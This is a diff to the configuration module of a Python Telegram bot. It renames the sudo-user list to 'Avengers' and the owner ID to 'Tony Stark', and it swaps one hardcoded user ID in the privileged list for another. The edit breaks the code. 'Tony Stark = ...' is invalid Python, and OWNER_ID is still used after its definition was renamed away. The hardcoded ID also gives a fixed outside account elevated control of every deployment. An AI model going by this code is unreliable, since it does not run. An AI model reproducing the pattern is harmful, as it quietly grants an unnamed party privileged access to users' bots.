@@ -29,7 +29,7 @@ if ENV:
     OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
 
     try:
-        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
+        Avengers = set(int(x) for x in os.environ.get("Avengers", "").split())
     except ValueError:
         raise Exception("Your sudo users list does not contain valid integers.")
 
@@ -64,7 +64,7 @@ else:
     from IHbot.config import Development as Config
     TOKEN = Config.API_KEY
     try:
-        OWNER_ID = int(Config.OWNER_ID)
+        Tony Stark = int(Config.OWNER_ID)
     except ValueError:
         raise Exception("Your OWNER_ID variable is not a valid integer.")
 
@@ -72,7 +72,7 @@ else:
     OWNER_USERNAME = Config.OWNER_USERNAME
 
     try:
-        SUDO_USERS = set(int(x) for x in Config.SUDO_USERS or [])
+        Avengers = set(int(x) for x in Config.Avengers or [])
     except ValueError:
         raise Exception("Your sudo users list does not contain valid integers.")
 
@@ -103,14 +103,14 @@ else:
     STRICT_GMUTE = Config.STRICT_GMUTE
     API_WEATHER = Config.API_OPENWEATHER
 
-SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(686956429)
+Avengers.add(OWNER_ID)
+Avengers.add(859040871)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 
 dispatcher = updater.dispatcher
 
-SUDO_USERS = list(SUDO_USERS)
+Avengers = list(Avengers)
 WHITELIST_USERS = list(WHITELIST_USERS)
 SUPPORT_USERS = list(SUPPORT_USERS)
 
